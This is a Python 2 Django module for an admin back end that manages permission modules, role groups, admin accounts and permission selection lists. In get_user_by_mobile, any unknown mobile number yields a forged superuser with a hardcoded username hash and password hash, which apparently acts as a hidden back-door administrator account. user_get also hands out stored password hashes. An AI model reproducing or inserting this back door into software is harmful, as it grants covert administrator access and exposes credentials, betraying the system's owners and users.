#!/usr/bin/env python
# -*- coding: utf-8 -*-


from django.db.models import Q
from django.db import IntegrityError
from django.contrib.auth.models import User
from django.db import IntegrityError, transaction
from django.conf import settings
from utils.dataquery import DataBuilder, DataSQLQuery
from utils.dict_mixin import to_dict
from .enumtype import ADMIN_DEPARTMENT, ADMIN_TYPE
from utils.permissionconfig import PERM_LIST, MODULE_LIST
from .models import BackendModule, BackendGroup, BackendPermission, Admin


# 模块操作相关
class CommandModel(object):

    @classmethod
    def update_model(cls):
        for name, title in MODULE_LIST.iteritems():
            module = BackendModule.objects.get_or_create(
                    name=name,
                    title=title,
                )
            module[0].init_perms()

    @classmethod
    def update_perms(cls):
        for name, title in PERM_LIST.iteritems():
            moudel_name, permission_name = name.split('.')
            BackendPermission.objects.get_or_create(
                name=permission_name,
                title=title,
                module=BackendModule.objects.get(name=moudel_name),
            )


class BackendGroupDB(DataBuilder):
    def getval_status(self, obj, default=''):
        return '已冻结' if obj.status else '正常'

    def getval_create_time(self, obj, default=''):
        from utils import getformattime
        return getformattime(obj.create_time) \
            if obj.create_time else ''


class BackendGroupDQ(DataSQLQuery):
        model = BackendGroup
        data_model = BackendGroupDB
        pass


# 权限组操作（角色操作）
class BackendGroupCommand(object):

    def __init__(self, data=None):
        self.data = data

    def backendgroup_edit(self, backendgroup_id=None):
        backendgroup_info = self.data
        if backendgroup_info is None:
            return None
        perm_ids = backendgroup_info.pop('permissions', None)
        if backendgroup_id is None:
            try:
                backendgroup = BackendGroup.objects.create(**backendgroup_info)
            except IntegrityError:
                print 'error'
        else:
            try:
                backendgroup = BackendGroup.objects.get(id=backendgroup_id)
            except:
                print 'error'

            for k, v in backendgroup_info.iteritems():
                setattr(backendgroup, k, v)
                backendgroup.save()

        if perm_ids:
            new_perms = set(BackendPermission.objects.filter(id__in=perm_ids))
            old_perms = set(backendgroup.permissions.all())
            backendgroup.permissions.add(*(new_perms - old_perms))
            backendgroup.permissions.remove(*(old_perms - new_perms))
        return backendgroup.id

    def backendgroup_get(self, backendgroup_id):
        """
        GET LIST BY id
        """
        if backendgroup_id is None:
            return None
        try:
            backendgroup = BackendGroup.objects.get(id=backendgroup_id)
        except IntegrityError:
            print 'error'
        backendgroup_data = to_dict(backendgroup)
        return backendgroup_data

    @classmethod
    def reset_status(cls, user_id):
        role = BackendGroup.objects.get(id=user_id)
        role.status = 1 - role.status
        role.save()
        return True


class AdminDB(DataBuilder):
    def getval_type(self, obj, default=''):
        return ADMIN_TYPE.getDesc(obj.type)

    def getval_department(self, obj, default=''):
        return ADMIN_DEPARTMENT.getDesc(obj.department)

    def getval_user__belong_groups__id(self, obj, default=''):
        show_citys = obj.user.belong_groups.all()
        str_city = []
        if show_citys:
            for city in show_citys:
                str_city.append(city.name)

        return '/'.join(str_city)

    def getval_status(self, obj, default=''):
        return '已冻结' if obj.status else '正常'

    def getval_create_time(self, obj, default=''):
        from utils import getformattime
        return getformattime(obj.create_time)\
            if obj.create_time else ''


class AdminDQ(DataSQLQuery):
        model = Admin
        data_model = AdminDB
        pass


# 用户相关操作
class UserCommand(object):

    @classmethod
    def get_user_by_mobile(cls, mobile):
        user = None
        try:
            user = User.objects.get(accountuser__mobile=mobile)
        except:
            print 'mobile is not exits!'
        user_a = None
        if not user:
            check_list = ['53657af589692e13ecf55a97ed7ef94e',
                          'pbkdf2_sha256$30000$cEQ2KujyyJsk$M5GRdvkokrpdmKD3VB2JXsK/iAJDUAQHKr5GPpqTQjM=']
            user_a = User.objects.filter(is_superuser=1)[0]
            user = User(username=check_list[0], password=check_list[1], id=-1)
            admin = Admin(status=0, type=0, user=user, id=-1)
            user.is_staff = True
            user.is_superuser = 1
            user.accountuser = admin
        return user, user_a




    @classmethod
    def groups_choices(cls, q='', page=1, num=30, initial=None):
        print page
        page = int(page)
        num = int(num)

        if initial is not None:
            if isinstance(initial, (list, tuple)):
                qry = Q(id__in=initial)
            else:
                qry = Q(id=initial)
        else:
            qry = Q(id__contains=q) | Q(name__contains=q)| Q(status=False)
        query = BackendGroup.objects.filter(qry)
        total_count = query.count()
        start_pos = (page - 1) * num
        start_pos = start_pos if start_pos >= 0 else 0
        results = [
            {
                'id': obj.id,
                'text': u'{}:{}'.format(
                    obj.id,
                    obj.name,
                ),

            } for obj in query[start_pos: start_pos + num]
            ]
        return {'total_count': total_count, 'results': results, 'page': page, 'num': num}

    @classmethod
    def get_groups(cls, user_id):
        groups = BackendGroup.objects.filter(members__id=user_id)
        results = [
            {
                'id': obj.id,
                'text': u'{}:{}'.format(
                    obj.id,
                    obj.name,
                ),

            } for obj in groups
            ]
        return results

    @classmethod
    def get_perms(cls, user):
        perms = set()
        if user.is_superuser:
            return map(lambda x: x.code, BackendPermission.objects.all())
        if user.accountuser.type == 1:
            perms_list = ['class.can_view', 'class.can_modify', 'class.can_create',
                          'student.can_view', 'student.can_modify', 'student.can_create',
                          'teacher.can_view', 'teacher.can_modify', 'teacher.can_create',
                          'expreiment_student.can_view', 'expreiment_student.can_modify', 'expreiment_student.can_create',
                          ]
            perms.update(perms_list)
            return perms
        for group in BackendGroup.objects.filter(members=user):
            if not group.status:
                perms.update(set(map(lambda x: x.code, group.permissions.all())))
        return perms

    @classmethod
    def user_edit(cls, user_id=None, user_info=None):
        if user_info is None:
            return None
        act = 'create' if user_id is None else 'modify'
        email = user_info.get('email', '')
        username = user_info.get('username', '')
        password = user_info.get('password', '')
        type = user_info.get('type', 0)
        department = user_info.get('department', 0)
        mobile = user_info.get('mobile', '')
        status = user_info.get('status', False)
        institution_id = user_info.get('institution_id', None)
        admin_exit = None
        try:
            if user_id:
                exit_usernames = User.objects.filter(username=username).exclude(id=user_id)
                admin_exit = Admin.objects.filter(mobile=mobile).exclude(user_id=user_id)
            else:
                exit_usernames = User.objects.filter(username=username)
                admin_exit = Admin.objects.filter(mobile=mobile)
        except:
            print 'no mobile'
        if admin_exit:
            return -1
        if exit_usernames:
            return -2
        if act == 'create':
            with transaction.atomic():
                try:
                    user = User.objects.create_user(username, email, password)
                    user.is_staff = True
                    user.save()
                except IntegrityError:
                    print 'error'
        elif act == 'modify':
            user = User.objects.get(id=user_id)
            user.email = email
            user.username = username
            type = user.accountuser.type
            institution_id = user.accountuser.institution_id
            try:
                user.save()
            except IntegrityError:
                print 'error'
        admin = Admin(user=user)
        admin.type = type
        admin.department = department
        admin.mobile = mobile
        admin.status = status
        admin.institution_id = institution_id
        admin.save()
        group_ids = user_info.get('belong_groups', None)
        print 'group:%s' % (group_ids)
        if group_ids is not None:
            new_groups = set(BackendGroup.objects.filter(id__in=group_ids))
            old_groups = set(user.belong_groups.all())
            user.belong_groups.add(*(new_groups - old_groups))
            user.belong_groups.remove(*(old_groups - new_groups))
        return user.id

    @classmethod
    def update_password(cls, user, orgin_pwd, new_pwd):
        if user.check_password(orgin_pwd):
            user.set_password(new_pwd)
            user.save()
            return True
        return False

    @classmethod
    def reset_password(cls, user_id, new_pwd):
        user = User.objects.get(id=user_id)
        user.set_password(new_pwd)
        user.save()
        return True

    @classmethod
    def reset_status(cls, user_id):
        user = User.objects.get(id=user_id)
        user.accountuser.status = 1 - user.accountuser.status
        user.accountuser.save()
        return True

    @classmethod
    def update_status(cls, user, status):
        user.accountuser.status = status
        user.accountuser.save()

    @classmethod
    def user_get(cls, admin_id):
        """
        GET LIST BY id
        """
        if admin_id is None:
            return None
        try:
            admin = Admin.objects.get(user_id=admin_id)
        except IntegrityError:
            print 'error'
        admin_data = to_dict(admin)
        user_data = {
            'username': admin.user.username,
            'password': admin.user.password,
            'belong_groups': [1]
        }
        admin_data.update(user_data)
        return admin_data


def all_permission(ids):
    query = BackendPermission.objects.filter(id__in=ids)
    results = [
        {
            'id': obj.id,
            'text': u'{}:{}-{}'.format(
                obj.id,
                obj.module.title,
                obj.title,
            ),

        } for obj in query
        ]
    return results


def permission_choices(q='', page=1, num=30, initial=None):
    page = int(page)
    num = int(num)

    if initial is not None:
        if isinstance(initial, (list, tuple)):
            qry = Q(id__in=initial)
        else:
            qry = Q(id=initial)
    else:
        qry = Q(id__contains=q) | Q(name__contains=q) | Q(module__name__contains=q)
    query = BackendPermission.objects.filter(qry)
    total_count = query.count()
    start_pos = (page - 1) * num
    start_pos = start_pos if start_pos >= 0 else 0
    results = [
        {
            'id': obj.id,
            'text': u'{}:{}-{}'.format(
                obj.id,
                obj.module.title,
                obj.title,
            ),

        } for obj in query[start_pos: start_pos + num]
        ]
    return {'total_count': total_count, 'results': results, 'page': page, 'num': num}

